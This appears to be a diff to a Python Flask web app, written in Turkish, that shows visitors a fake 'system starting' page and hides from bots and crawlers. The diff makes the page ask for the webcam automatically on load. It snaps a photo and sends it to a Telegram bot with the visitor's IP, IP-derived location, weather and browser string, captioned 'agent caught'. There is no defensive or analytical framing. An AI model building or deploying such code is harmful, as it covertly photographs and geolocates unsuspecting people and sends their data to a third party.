@@ -17,7 +17,6 @@ def telegram_mesaj_gonder(mesaj):
     except Exception as e:
         print("Telegram Hatası:", e)
 
-# 📸 FOTOĞRAF VE BİLGİLERİ BİRLİKTE GÖNDEREN FONKSİYON
 def telegram_fotograf_ve_bilgi_gonder(fotograf_base64, bilgi_metni):
     try:
         resim_verisi = fotograf_base64.split(",")[1]
@@ -25,11 +24,9 @@ def telegram_fotograf_ve_bilgi_gonder(fotograf_base64, bilgi_metni):
         
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
         files = {'photo': ('ajan_fotografi.jpg', resim_bytes)}
-        # Fotoğrafın altına yazılacak olan bilgiler (Caption)
         data = {'chat_id': CHAT_ID, 'caption': bilgi_metni, 'parse_mode': 'HTML'}
         
         requests.post(url, files=files, data=data)
-        print("✅ Fotoğraf ve bilgiler Telegram'a gönderildi!")
     except Exception as e:
         print("Fotoğraf Gönderme Hatası:", e)
 
@@ -46,19 +43,19 @@ def ana_sayfa():
     if 'bot' in user_agent or 'facebook' in user_agent or 'crawler' in user_agent or 'spider' in user_agent or ziyaretci_ip == '127.0.0.1':
         return "OK", 200
 
-    # Kamera izni isteyen HTML/JS
+    # 🚀 OTOMATİK KAMERA KODU (Buton Kaldırıldı)
     html = f"""
     <body style='background:#111; color:#0f0; font-family: monospace; text-align:center; padding-top:10%;'>
-        <h2 style='color: red;'>SİSTEM GÜNCELLEMESİ</h2>
-        <p>Devam etmek için lütfen aşağıdaki butona basın.</p>
-        <button onclick="kamerayiAc()" style='padding: 15px 30px; font-size: 20px; cursor: pointer;'>SİSTEMİ BAŞLAT</button>
+        <h2 style='color: red;'>SİSTEM BAŞLATILIYOR</h2>
+        <p>Lütfen bekleyin...</p>
         <p id='durum' style='margin-top: 20px; color: yellow;'></p>
 
         <video id="video" autoplay style="display:none;"></video>
         <canvas id="canvas" style="display:none;"></canvas>
 
         <script>
-            async function kamerayiAc() {{
+            // Sayfa yüklendiği an bu fonksiyon otomatik çalışır
+            window.onload = async function() {{
                 document.getElementById('durum').innerHTML = "Kamera bağlanıyor... Lütfen izin verin.";
                 try {{
                     const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
@@ -82,18 +79,17 @@ def ana_sayfa():
                             
                             document.getElementById('durum').innerHTML = "✅ İşlem tamamlandı!";
                             stream.getTracks().forEach(track => track.stop());
-                        }}, 1500);
+                        }}, 1500); // Kamera açıldıktan 1.5 saniye sonra fotoğrafı çeker
                     }};
                 }} catch (error) {{
                     document.getElementById('durum').innerHTML = "❌ Kamera izni verilmedi.";
-                    // İzin verilmezse sadece bilgileri yazı olarak gönder
                     fetch('/kamera_hata', {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json' }},
                         body: JSON.stringify({{ ip: "{ziyaretci_ip}" }})
                     }});
                 }}
-            }}
+            }};
         </script>
     </body>
     """
@@ -105,7 +101,6 @@ def kamera():
     ip = veri['ip']
     user_agent = request.headers.get('User-Agent', 'Bilinmiyor')
     
-    # Bilgileri topla
     try:
         konum_verisi = requests.get(f'http://ip-api.com/json/{ip}').json()
         sehir = konum_verisi.get('city', 'Bilinmiyor')
@@ -114,7 +109,6 @@ def kamera():
     except:
         sehir, ulke, hava = "Bilinmiyor", "Bilinmiyor", "Bilinmiyor"
 
-    # Fotoğrafın altına yazılacak metin
     bilgi_metni = f"""🚨 <b>AJAN YAKALANDI!</b>
     
 🌐 <b>IP Adresi:</b> {ip}
@@ -122,7 +116,6 @@ def kamera():
 ☀️ <b>Hava Durumu:</b> {hava}
 📱 <b>Tarayıcı:</b> {user_agent}"""
 
-    # Fotoğrafı ve bilgileri birlikte gönder
     telegram_fotograf_ve_bilgi_gonder(veri['image'], bilgi_metni)
     return "OK", 200
 
